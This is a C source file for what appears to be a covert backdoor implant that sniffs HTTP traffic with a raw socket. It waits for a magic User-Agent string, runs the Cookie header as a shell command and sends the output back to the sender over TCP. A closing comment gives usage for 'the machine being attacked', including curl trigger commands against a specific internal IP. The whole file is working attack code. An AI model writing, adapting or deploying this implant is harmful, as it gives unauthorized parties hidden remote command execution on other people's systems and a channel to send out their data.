#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>

#define BUFFER_SIZE 65536
#define PIPE_SIZE 2048
#define USER_AGENT "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/420.69 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"

char *toIP(uint32_t ip) {
    char *ip_str = malloc(16); // Maximum length of IPv4 address string is 15 + 1 for '\0'
    if (!ip_str) { perror("Memory allocation failed"); return NULL; }
    snprintf(ip_str, 16, "%u.%u.%u.%u", ip & 0xFF, (ip >> 8) & 0xFF, (ip >> 16) & 0xFF, (ip >> 24) & 0xFF);
    return ip_str;
}

char *get_http_header(const char *request, const char *header_name) {
    // Create a buffer to store the header we're looking for (e.g., "User-Agent: ")
    char *header = (char *)malloc(strlen(header_name) + 3);  // ": " + null terminator
    if (!header) { perror("Memory allocation failed"); return NULL; }
    sprintf(header, "%s: ", header_name);

    const char *header_start = strstr(request, header);
    if (header_start == NULL) { free(header); return NULL; }

    const char *header_end = strstr(header_start, "\r\n");
    if(header_end == NULL) { free(header); return NULL; }

    size_t header_value_len = header_end - header_start - strlen(header);

    char *header_value = (char *)malloc(header_value_len + 1);  // +1 for null terminator
    if(!header_value) { free(header); return NULL; }

    strncpy(header_value, header_start + strlen(header), header_value_len);
    header_value[header_value_len] = '\0';  // Null-terminate the string

    free(header);  // Clean up the header name buffer
    return header_value;  // Return the extracted value
}

void send_tcp_packet(const char *target_ip, int target_port, const char *message) {
    // Create a socket
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("Socket creation failed");
        return;
    }

    // Define the target address
    struct sockaddr_in target_addr;
    memset(&target_addr, 0, sizeof(target_addr)); // Initialize to zero
    target_addr.sin_family = AF_INET;             // IPv4
    target_addr.sin_port = htons(target_port);    // Convert port to network byte order

    // Convert IP address from text to binary
    if (inet_pton(AF_INET, target_ip, &target_addr.sin_addr) <= 0) {
        perror("Invalid address or address not supported");
        close(sock);
        return;
    }

    // Connect to the target server
    if (connect(sock, (struct sockaddr*)&target_addr, sizeof(target_addr)) < 0) {
        perror("Connection failed");
        close(sock);
        return;
    }

    // Send the message to the server
    if (send(sock, message, strlen(message), 0) < 0) {
        perror("Send failed");
        close(sock);
        return;
    }

    printf("Message sent to %s:%d\n", target_ip, target_port);

    // Close the socket
    close(sock);
}

void send_udp_packet(const char *target_ip, int target_port, const char *message) {
    int sock, optval = 1;
    sock = socket(AF_INET, SOCK_DGRAM, 0);
    setsockopt(sock, IPPROTO_IP, IP_FREEBIND, &optval, sizeof(optval));

    if (sock < 0) { 
        perror("Unable to create UDP socket"); 
        exit(EXIT_FAILURE); 
    }
    struct sockaddr_in dest;
    memset(&dest, 0, sizeof(dest)); // basically calloc
    dest.sin_family = AF_INET;
    dest.sin_port = htons(target_port);
    dest.sin_addr.s_addr = inet_addr(target_ip);

    // Send the UDP packet
    ssize_t sent_bytes = sendto(sock, message, strlen(message), 0, (struct sockaddr *)&dest, sizeof(dest));
    if (sent_bytes < 0) {
        perror("Packet send failed");
    } else {
        printf("UDP packet sent to %s:%d\n", target_ip, target_port);
    }

    // Close the socket
    close(sock);
}


char *run_command(const char *cmd) {
    // Create I/O pipe to capture command output
    int pipefd[2];
    if (pipe(pipefd) == -1) { perror("pipe"); exit(EXIT_FAILURE); }

    pid_t pid = fork();
    if (pid <0) { perror("fork failed"); exit(EXIT_FAILURE); }

    // Child process: Redirect output to the pipe
    if (pid == 0){
        close(pipefd[0]);  // Close the read end of the pipe

        // Redirect standard output to the write end of the pipe
        dup2(pipefd[1], STDOUT_FILENO);
        close(pipefd[1]);  // Close the write end after duplicating

        // Child process: Execute the command (do we want a shell invoked or not?)
        char *argv[] = {"/bin/sh", "-c", (char *)cmd, NULL};  // Prepare command
        char *envp[] = {NULL};  // No environment variables

        execve("/bin/sh", argv, envp);
        perror("execve failed");  // If execve fails
        exit(EXIT_FAILURE);
    }

    // Parent process: Close the write end of the pipe
    close(pipefd[1]);

    char buffer[PIPE_SIZE];
    int bytes_read;
    while ((bytes_read = read(pipefd[0], buffer, sizeof(buffer) - 1)) > 0) {
        buffer[bytes_read] = '\0';  // Null-terminate the string
        // printf("BUFFER:\n%s\n", buffer);  // Print the captured output
    }

    wait(NULL);  // Wait for the child to complete
    int output_len = strlen(buffer);
    char *output = calloc(1, output_len+1);
    strncpy(output, buffer, output_len);
    return output;
}

char *http_to_command(const char *http_data, int data_size) {
    const char *http = strstr(http_data, "HTTP/1.1");
    if (http == NULL || strcmp(get_http_header(http, "User-Agent"), USER_AGENT)) // Check for flag
        return NULL;
    return get_http_header(http, "Cookie");
}

// Function to process TCP packets
void process_packet(unsigned char* buffer, int size) {
    struct iphdr *ip_header = (struct iphdr*)buffer;
    unsigned short ip_header_len;

    if (ip_header->protocol != 6) // Ignore non-TCP
        return;

    ip_header_len = ip_header->ihl * 4;
    struct tcphdr *tcp_header = (struct tcphdr *)(buffer+ip_header_len);

    if (ntohs(tcp_header->dest) != 80) // Ignore non-HTTP
        return;

    char *http_payload = (char *)(buffer + ip_header_len + tcp_header->doff * 4);
    int http_data_size = size - (ip_header_len + tcp_header->doff * 4);

    if(http_data_size <= 0) return; // Empty

    // Get command, run command, get output
    const char *command = http_to_command(http_payload, http_data_size);
    if (command == NULL) return;
    const char *output = run_command(command);
    if (output == NULL) return;

    // Get return port
    char *return_port_string = get_http_header(http_payload, "Upgrade-Insecure-Requests");
    if (return_port_string == NULL) return;
    int return_port = atoi(return_port_string);
    if (return_port == 0) return;

    
    // send_udp_packet("10.42.2.16", return_port, output);

    // FIXME: Modify this to return to sender:
    send_tcp_packet(toIP(ip_header->saddr), return_port, output);
}

int main() {
    int sock_raw;
    struct sockaddr_in source_socket;
    int source_socket_size = sizeof(source_socket);
    unsigned char *buffer = (unsigned char *)malloc(BUFFER_SIZE);

    // Create a raw socket
    sock_raw = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock_raw < 0) {
        perror("Socket creation failed");
        return 1;
    }

    // Receive packets
    while (1) {
        int packet_size = recvfrom(sock_raw, buffer, BUFFER_SIZE, 0, (struct sockaddr *)&source_socket, &source_socket_size);
        if (packet_size < 0) {
            perror("Packet receive failed");
            continue;
        }
        // Process the packet
        process_packet(buffer, packet_size);
    }

    close(sock_raw);
    free(buffer);
    return 0;
}


/*

Usage: on the machine being attacked run ./c3

To Attack:
User-Agent must match exactly 
Will run the command in Cookie

curl <IP> -A "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/420.69 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36" -H "Cookie: <COMMAND>" -H "Upgrade-Insecure-Requests: [RETURN PORT]"
curl 10.42.2.15 -A "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/420.69 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36" -H "Cookie: <COMMAND>" -H "Upgrade-Insecure-Requests: [RETURN PORT]"

*/